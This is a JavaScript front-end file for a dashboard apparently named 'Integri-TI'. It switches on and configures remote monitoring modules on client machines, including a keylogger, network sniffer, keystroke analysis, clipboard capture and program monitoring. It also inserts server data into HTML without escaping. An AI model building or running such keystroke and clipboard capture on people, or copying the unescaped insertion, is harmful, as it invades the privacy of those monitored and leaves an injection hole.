/**
 * Integri-TI - Módulos
 * Gestión y distribución de configuraciones remotas por HTTP
 */
let moduloActualModal = '';
let configsModulosCache = {};

const mapaCheckboxes = {
  'sniffer': 'toggle-sniffer',
  'keylogger': 'toggle-keylogger',
  'keystrokes svm': 'toggle-keystrokes_svm',
  'keystrokes_svm': 'toggle-keystrokes_svm',
  'error_detection': 'toggle-error_detection',
  'paperclip': 'toggle-paperclip',
  'program monitor': 'toggle-program_monitor',
  'program_monitor': 'toggle-program_monitor'
};

const mapaSubtitulos = {
  'sniffer': 'sub-sniffer',
  'keylogger': 'sub-keylogger',
  'keystrokes svm': 'sub-keystrokes_svm',
  'error_detection': 'sub-error_detection',
  'paperclip': 'sub-paperclip',
  'program monitor': 'sub-program_monitor'
};

async function cargarConfiguracionModulos() {
  try {
    const data = await Api.getModulos(clienteSeleccionado);
    configsModulosCache = data;

    for (const [mod, conf] of Object.entries(data)) {
      const toggleId = mapaCheckboxes[mod];
      if (toggleId) {
        const el = document.getElementById(toggleId);
        if (el) {
          const isEnabled = (conf.enabled || '').toLowerCase() === 'true';
          el.checked = isEnabled;
        }
      }
      const subId = mapaSubtitulos[mod];
      if (subId) {
        const el = document.getElementById(subId);
        if (el) {
          const destLabel = clienteSeleccionado === 'global' ? 'global' : clienteSeleccionado.split('@')[0];
          el.textContent = conf.log_file ? `${destLabel} • ${conf.log_file}` : `${destLabel} • HTTP`;
        }
      }
    }
  } catch (e) {
    console.error('Error cargando configs de módulos:', e);
  }
}

async function toggleModulo(nombre, checkbox) {
  const nuevoValor = checkbox.checked ? 'True' : 'False';
  try {
    const res = await Api.actualizarModulo(nombre, clienteSeleccionado, { enabled: nuevoValor });
    if (res.status === 'ok') {
      mostrarToast(`${nombre}: enabled = ${nuevoValor}`);
    } else {
      checkbox.checked = !checkbox.checked;
      mostrarToast(`Error enviando configuración`, true);
    }
  } catch (err) {
    checkbox.checked = !checkbox.checked;
    mostrarToast(`Error de red al enviar configuración`, true);
  }
}

async function abrirAjustesModulo(nombre) {
  moduloActualModal = nombre;
  const modal = document.getElementById('modal-ajustes');
  const titulo = document.getElementById('modal-titulo');
  const archivoRuta = document.getElementById('modal-archivo-ruta');
  const cuerpo = document.getElementById('modal-cuerpo-campos');
  const statusMsg = document.getElementById('modal-status-msg');

  const targetLabel = clienteSeleccionado === 'global' ? 'Global' : clienteSeleccionado;
  if (titulo) titulo.textContent = `Ajustes: ${nombre.toUpperCase()}`;
  if (archivoRuta) archivoRuta.textContent = `Destino: ${targetLabel} • Envío por HTTP`;
  if (statusMsg) statusMsg.textContent = '';
  if (cuerpo) cuerpo.innerHTML = '<div class="py-6 text-center text-slate-500">Solicitando configuración...</div>';

  if (modal) modal.classList.remove('hidden');

  try {
    const data = await Api.getModulo(nombre, clienteSeleccionado);
    if (data.status !== 'ok') {
      cuerpo.innerHTML = `<div class="text-red-400">Error: ${data.mensaje || 'No se pudo cargar'}</div>`;
      return;
    }

    const conf = data.config || {};
    let html = '';
    const boolKeys = ['enabled', 'show_interface', 'capture_errors', 'capture_input', 'capture_print', 'log_content', 'log_title_changes'];

    for (const [k, v] of Object.entries(conf)) {
      const isBool = boolKeys.includes(k.toLowerCase()) || v.toLowerCase() === 'true' || v.toLowerCase() === 'false';
      
      if (isBool) {
        const isTrue = v.toLowerCase() === 'true';
        html += `
          <div class="flex items-center justify-between p-2 rounded bg-[#0b0f19] border border-[#1f2937]">
            <div>
              <span class="text-slate-300 font-medium block text-[11px]">${k}</span>
              <span class="text-[9px] text-slate-500">Booleano</span>
            </div>
            <select data-campo="${k}" class="modal-campo-input bg-[#111827] border border-[#1f2937] text-slate-200 rounded px-2 py-1 text-xs focus:outline-none">
              <option value="True" ${isTrue ? 'selected' : ''}>True (Habilitado)</option>
              <option value="False" ${!isTrue ? 'selected' : ''}>False (Deshabilitado)</option>
            </select>
          </div>
        `;
      } else {
        html += `
          <div class="flex flex-col gap-1 p-2 rounded bg-[#0b0f19] border border-[#1f2937]">
            <span class="text-slate-300 font-medium text-[11px]">${k}</span>
            <input data-campo="${k}" class="modal-campo-input bg-[#111827] border border-[#1f2937] text-slate-200 rounded px-2.5 py-1 text-xs focus:outline-none" type="text" value="${v}">
          </div>
        `;
      }
    }

    cuerpo.innerHTML = html || '<div class="text-slate-500">Sin campos</div>';

  } catch (e) {
    if (cuerpo) cuerpo.innerHTML = `<div class="text-red-400">Error conectando con el servidor</div>`;
  }
}

async function guardarAjustesModal() {
  if (!moduloActualModal) return;
  const inputs = document.querySelectorAll('#modal-cuerpo-campos .modal-campo-input');
  const payload = {};
  inputs.forEach(inp => {
    const campo = inp.getAttribute('data-campo');
    if (campo) payload[campo] = inp.value;
  });

  const statusMsg = document.getElementById('modal-status-msg');
  const btnGuardar = document.getElementById('btn-guardar-modal');
  if (btnGuardar) btnGuardar.disabled = true;

  try {
    const data = await Api.actualizarModulo(moduloActualModal, clienteSeleccionado, payload);

    if (data.status === 'ok') {
      if (statusMsg) {
        statusMsg.className = 'text-[11px] text-emerald-400';
        statusMsg.textContent = '✓ Configuración distribuida por HTTP';
      }
      mostrarToast(`Ajustes guardados para ${clienteSeleccionado}`);
      
      const toggleId = mapaCheckboxes[moduloActualModal];
      if (toggleId && payload.enabled) {
        const el = document.getElementById(toggleId);
        if (el) el.checked = payload.enabled.toLowerCase() === 'true';
      }

      setTimeout(cerrarModalAjustes, 600);
    } else {
      if (statusMsg) {
        statusMsg.className = 'text-[11px] text-red-400';
        statusMsg.textContent = 'Error: ' + (data.mensaje || 'No se pudo guardar');
      }
    }
  } catch (e) {
    if (statusMsg) {
      statusMsg.className = 'text-[11px] text-red-400';
      statusMsg.textContent = 'Error de comunicación';
    }
  } finally {
    if (btnGuardar) btnGuardar.disabled = false;
  }
}

function cerrarModalAjustes() {
  const modal = document.getElementById('modal-ajustes');
  if (modal) modal.classList.add('hidden');
  moduloActualModal = '';
}

